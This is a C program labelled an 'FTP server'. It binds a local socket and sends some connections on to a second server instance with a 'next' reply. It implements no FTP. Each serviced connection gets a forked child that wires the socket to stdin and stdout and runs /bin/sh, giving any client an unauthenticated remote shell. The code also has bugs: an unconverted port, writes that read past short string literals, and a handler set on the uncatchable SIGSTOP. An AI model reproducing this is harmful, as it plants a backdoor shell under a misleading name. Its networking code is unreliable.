#define _XOPEN_SOURCE 500
#define _XOPEN_SOURCE_EXTENDED 1

/*FTP server*/
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/signal.h>
#include <dirent.h>
#include <arpa/inet.h>
#include <stdint.h>

#define MAX_SIZE 1024

/*for getting file size using stat()*/
#include <sys/stat.h>

/*for sendfile()*/
#include <sys/sendfile.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

/*for O_RDONLY*/
#include <fcntl.h>

#include <ftw.h>

#ifdef WIN32
#include <io.h>
#define F_OK 0
#define access _access
#endif
static int RESPONSE_SIZE = 1000;
static int serverSocket;
static int socketFd;
int counter=1;
static int COMMAND_SIZE = 15;
static int clientSocket;


/**
Handler for gracefully closing the client socket
**/
void CTR_handler()
{
    printf("\nsignal handler called :: closing client socket\n");
    close(clientSocket);
    exit(0);
}
/**
 *
 * create socket using ip address: 127.0.0.1 and given port
 **/
int createServerSocket(char *serverPort)
{
    int socketFd, result, backlog = 1, opt;
    struct sockaddr_in server, client;
    socketFd = socket(AF_INET, SOCK_STREAM, 0);     // creates a socket
   
    if (socketFd == -1)
    {
        printf("Socket creation failed");
        exit(1);
    }

    server.sin_family = AF_INET;        
    server.sin_port = atoi(serverPort);     // convert serverPort to int and use for server
    printf("Ports: serverPort:%s & convertedPort:%d", serverPort, ntohs(server.sin_port));
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    inet_pton(AF_INET, "127.0.0.1", &server.sin_addr);
    result = bind(socketFd, (struct sockaddr *)&server, sizeof(server));    // binds the socket with server address and port
    if (result == -1)
    {
        printf("Binding error");
        perror("error");
        exit(1);
    }
    result = listen(socketFd, backlog);     // server starts listening at given port and ip address for client connections
    if (result == -1)
    {
        perror("Listen failed");
        exit(1);
    }
    printf("\nServer is running at %s:%d", inet_ntoa(server.sin_addr), ntohs(server.sin_port));
    return socketFd;
}

void sendResponse(int serverSocket, char response[RESPONSE_SIZE])
{
    send(serverSocket, response, RESPONSE_SIZE, 0);
}
//argv[2]=0 base server
//argv[2]=1 second server
int main(int argc, char *argv[])
{

    printf("\nserver execution started\n");
    struct sockaddr_in client;
	struct sockaddr_in server2;
    char buf[512], command[5], filename[20];
    int len;
    signal(SIGINT, CTR_handler);    // associate CTR_handler with SIGINT signal
    signal(SIGSTOP, CTR_handler);  // associate CTR_handler with SIGSTOP signal
 
	if (argc > 1)
    {
        // control connection
        socketFd = createServerSocket(argv[1]);
        printf("\nServer is waiting for client\n");
        len = sizeof(client);
        while (1)       // server keeps accepting client connections through a loop to handle multiple clients
        {
            serverSocket = accept(socketFd, (struct sockaddr *)&client, &len);
            printf("Connection accepted from %s:%d\n", inet_ntoa(client.sin_addr), ntohs(client.sin_port));

            printf("\n Connection Number: %d \n", counter);
            
            if( ((counter >5 && counter <= 10) || (counter > 10 && counter%2==0)) && (strcmp(argv[2],"0")==0) ){
                printf("In Redirection");
                write(serverSocket,"next\n",15);
                counter++;
                fflush(stdout);
                continue;
            }
            /*else if( ((counter <= 5 && counter >= 0) || (counter > 10 && counter%2==0)) && (strcmp(argv[2],"1")==0) ){
                printf("Serviced by the previous server");
                write(serverSocket,"ok\n",15);
                counter++;
                fflush(stdout);
                continue;
            }*/
            else{
                write(serverSocket,"ok\n",15);
                if (strcmp(argv[2],"0")==0){
                printf("Servicing from Server 1");
                }
                
                else if (strcmp(argv[2],"1")==0){
                    printf("Servicing from Server 2");
                }
                fflush(stdout);
                pid_t  cpid; 
                cpid = fork();
                if (cpid < 0) exit(1);  /* exit if fork() fails */
                if ( cpid ) {
                } else {
                
                    /* In the child process: */
                    
                    close(STDOUT_FILENO);
                    close(STDIN_FILENO);
                    dup2(serverSocket, STDOUT_FILENO);
                    dup2(serverSocket, STDIN_FILENO);
                    system("/bin/sh");
                }
    
            }
            counter++;
                       
        }
    }
}